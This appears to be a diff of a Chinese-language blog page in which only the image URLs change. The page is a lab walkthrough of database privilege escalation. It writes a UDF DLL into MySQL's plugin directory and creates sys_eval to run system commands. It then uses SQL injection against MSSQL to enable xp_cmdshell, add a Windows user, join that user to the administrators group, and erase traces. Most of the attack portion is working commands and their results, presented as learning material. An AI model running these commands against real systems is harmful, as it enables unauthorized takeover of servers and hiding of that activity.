 <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;xxx&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;C:\\phpstudy_pro\\Extensions\\MySQL5.5.29\\lib\::$INDEX_ALLOCATION&#x27;</span>;<br><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215170141213.png" srcset="/img/loading.gif" lazyload alt="image-20240215170141213"></p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215170146132.png" srcset="/img/loading.gif" lazyload alt="image-20240215170146132"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215170141213.png" srcset="/img/loading.gif" lazyload alt="image-20240215170141213"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215170146132.png" srcset="/img/loading.gif" lazyload alt="image-20240215170146132"></p>
 <p>虽然说是False  但是其实已经创建成功</p>
 <p>同样的方式传创建 plugin</p>
 <figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">select &#x27;xxx&#x27; into outfile &#x27;C:<span class="hljs-symbol">\\</span>phpstudy_pro<span class="hljs-symbol">\\</span>Extensions<span class="hljs-symbol">\\</span>MySQL5.5.29<span class="hljs-symbol">\\</span>lib<span class="hljs-symbol">\\</span>plugin\::$INDEX_ALLOCATION&#x27;;<br></code></pre></td></tr></table></figure>
@@ -775,18 +775,18 @@
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> <span class="hljs-number">0</span>x4d5a90000300000004000000ffff0000b80000000000000040000000000 into dumpfile &#x27;C:/phpstudy_pro/Extensions/MySQL5.<span class="hljs-number">5</span>.<span class="hljs-number">29</span>/lib/plugin/udf.dll&#x27;<br></code></pre></td></tr></table></figure>
 
 <p>注意替换这个值</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215172521282.png" srcset="/img/loading.gif" lazyload alt="image-20240215172521282"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215172521282.png" srcset="/img/loading.gif" lazyload alt="image-20240215172521282"></p>
 <p>执行成功</p>
 </li>
 <li><p>创建自定义函数</p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval returns <span class="hljs-keyword">string</span> soname <span class="hljs-string">&#x27;udf.dll&#x27;</span><br><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215173040705.png" srcset="/img/loading.gif" lazyload alt="image-20240215173040705"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215173040705.png" srcset="/img/loading.gif" lazyload alt="image-20240215173040705"></p>
 </li>
 <li><p>执行系统命令</p>
 <figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">select</span> <span class="hljs-function"><span class="hljs-title">sys_eval</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215173137205.png" srcset="/img/loading.gif" lazyload alt="image-20240215173137205"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215173137205.png" srcset="/img/loading.gif" lazyload alt="image-20240215173137205"></p>
 </li>
 </ul>
 <p>还有方法二，就是和上面学习过程的一样了，创建一个大型二进制对象</p>
@@ -794,39 +794,39 @@
 <p>先做一下痕迹清楚</p>
 <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada"># 删除函数<br>drop <span class="hljs-keyword">function</span> <span class="hljs-title">sys_eval</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175247691.png" srcset="/img/loading.gif" lazyload alt="image-20240215175247691"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175247691.png" srcset="/img/loading.gif" lazyload alt="image-20240215175247691"></p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># 删除函数<br><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> mysql.func <span class="hljs-keyword">where</span> <span class="hljs-type">name</span>=<span class="hljs-string">&#x27;sys_eval&#x27;</span><br><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175411134.png" srcset="/img/loading.gif" lazyload alt="image-20240215175411134"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175411134.png" srcset="/img/loading.gif" lazyload alt="image-20240215175411134"></p>
 <figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta"># 查看用户自定义函数</span><br><span class="hljs-keyword">select</span> * from mysql.<span class="hljs-keyword">func</span><br><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175452631.png" srcset="/img/loading.gif" lazyload alt="image-20240215175452631"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175452631.png" srcset="/img/loading.gif" lazyload alt="image-20240215175452631"></p>
 <p>已经不存在了</p>
 <p>接着就是第二个方法了</p>
 <ul>
 <li><p>创建一个大型二进制对象文件，用于存储dll</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"># <span class="hljs-type">BLOB</span>全称为<span class="hljs-type">Binary</span> <span class="hljs-keyword">Large</span> Objects，即大型二进制对象<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> udf(udf <span class="hljs-type">BLOB</span>);<br><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175624395.png" srcset="/img/loading.gif" lazyload alt="image-20240215175624395"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175624395.png" srcset="/img/loading.gif" lazyload alt="image-20240215175624395"></p>
 </li>
 <li><p>将udf.dll 二进制数据插入临时表udf 中：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">into</span> udf <span class="hljs-keyword">values</span>(<span class="hljs-keyword">CONVERT</span>(二进制文件,<span class="hljs-type">CHAR</span>));<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175827623.png" srcset="/img/loading.gif" lazyload alt="image-20240215175827623"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175827623.png" srcset="/img/loading.gif" lazyload alt="image-20240215175827623"></p>
 </li>
 <li><p>将<code>udf.dll</code>导出到<code>MySQL</code>安装目录下的<code>lib/plugin/udf1.dll</code>文件中：</p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> udf <span class="hljs-keyword">FROM</span> udf <span class="hljs-keyword">INTO</span> DUMPFILE <span class="hljs-string">&quot;C:/phpstudy_pro/Extensions/MySQL5.5.29/lib/plugin/udf1.dll&quot;</span><br><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175915802.png" srcset="/img/loading.gif" lazyload alt="image-20240215175915802"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215175915802.png" srcset="/img/loading.gif" lazyload alt="image-20240215175915802"></p>
 <p>发现是true</p>
 </li>
 <li><p>创建sys_eval 函数</p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval returns <span class="hljs-keyword">string</span> soname <span class="hljs-string">&#x27;udf1.dll&#x27;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215180019008.png" srcset="/img/loading.gif" lazyload alt="image-20240215180019008"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215180019008.png" srcset="/img/loading.gif" lazyload alt="image-20240215180019008"></p>
 </li>
 <li><p>执行命令</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215180112016.png" srcset="/img/loading.gif" lazyload alt="image-20240215180112016"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215180112016.png" srcset="/img/loading.gif" lazyload alt="image-20240215180112016"></p>
 <p>执行成功</p>
 </li>
 </ul>
@@ -835,53 +835,53 @@
 <p>发现测试目标是</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">10.1.1.215:8080</span>/Information.aspx?id=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215181329634.png" srcset="/img/loading.gif" lazyload alt="image-20240215181329634"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215181329634.png" srcset="/img/loading.gif" lazyload alt="image-20240215181329634"></p>
 <p>正常查询发现可以访问</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215181351775.png" srcset="/img/loading.gif" lazyload alt="image-20240215181351775"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215181351775.png" srcset="/img/loading.gif" lazyload alt="image-20240215181351775"></p>
 <p>添加单引号发现不能执行</p>
 <p>添加1&#x3D;2 发现不能执行</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215181533737.png" srcset="/img/loading.gif" lazyload alt="image-20240215181533737"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215181533737.png" srcset="/img/loading.gif" lazyload alt="image-20240215181533737"></p>
 <p>0x01  查看用户权限</p>
 <p>判断是否是sysadmin 组的用户，因为只有该组的用户才能执行xp_cmdshell</p>
 <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> IS_SRVROLEMEMBER (<span class="hljs-symbol">&#x27;sysadmin</span>&#x27;))=<span class="hljs-number">1</span><span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
 
 
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215182353487.png" srcset="/img/loading.gif" lazyload alt="image-20240215182353487"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215182353487.png" srcset="/img/loading.gif" lazyload alt="image-20240215182353487"></p>
 <p>发现成功出现信息说明&#x3D;1 成立</p>
 <p>0x02 判断是否存在xp_cndshell</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=(<span class="hljs-keyword">select</span> count(*) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype = <span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>)<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215182621619.png" srcset="/img/loading.gif" lazyload alt="image-20240215182621619"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215182621619.png" srcset="/img/loading.gif" lazyload alt="image-20240215182621619"></p>
 <p>发现存在xp_cmdshell</p>
 <p>0x03  判断xp_cmdshell 是否可用</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">;<span class="hljs-keyword">exec</span> master..xp_cmdshell &quot;net user name password /add&quot;<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215182818735.png" srcset="/img/loading.gif" lazyload alt="image-20240215182818735"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215182818735.png" srcset="/img/loading.gif" lazyload alt="image-20240215182818735"></p>
 <p>发现没有开启服务</p>
 <p>根据提示开启</p>
 <p>0x04 开启xp_cmdshell</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">;<span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215182942969.png" srcset="/img/loading.gif" lazyload alt="image-20240215182942969"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215182942969.png" srcset="/img/loading.gif" lazyload alt="image-20240215182942969"></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">;<span class="hljs-keyword">exec</span> master..xp_cmdshell &quot;ver&quot;<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183026173.png" srcset="/img/loading.gif" lazyload alt="image-20240215183026173"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183026173.png" srcset="/img/loading.gif" lazyload alt="image-20240215183026173"></p>
 <p>没有报错说明成功运行</p>
 <p>0x05 利用xp_cmdshell进行提取，也就是在目标服务器新建一个账户。</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">;<span class="hljs-keyword">exec</span> master..xp_cmdshell &quot;net user name password /add&quot;<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183141883.png" srcset="/img/loading.gif" lazyload alt="image-20240215183141883"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183141883.png" srcset="/img/loading.gif" lazyload alt="image-20240215183141883"></p>
 <p>执行发现并没有报错</p>
 <p>0x06  添加用户到管理员组</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">;<span class="hljs-keyword">exec</span> master..xp_cmdshell &quot;net localgroup administrators name /add&quot;<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183307294.png" srcset="/img/loading.gif" lazyload alt="image-20240215183307294"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183307294.png" srcset="/img/loading.gif" lazyload alt="image-20240215183307294"></p>
 <p>但是这个是内有回显的</p>
 <p>0x07 检测</p>
 <p>由于这个是本机搭建的环境所以我们本机访问</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183855762.png" srcset="/img/loading.gif" lazyload alt="image-20240215183855762"></p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183912072.png" srcset="/img/loading.gif" lazyload alt="image-20240215183912072"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183855762.png" srcset="/img/loading.gif" lazyload alt="image-20240215183855762"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215183912072.png" srcset="/img/loading.gif" lazyload alt="image-20240215183912072"></p>
 <p>已经成功的提权了</p>
 <p>前面发现可以通过xp_cmdshell 可以执行命令，如果我们执行payload 就直接获取的shell </p>
 
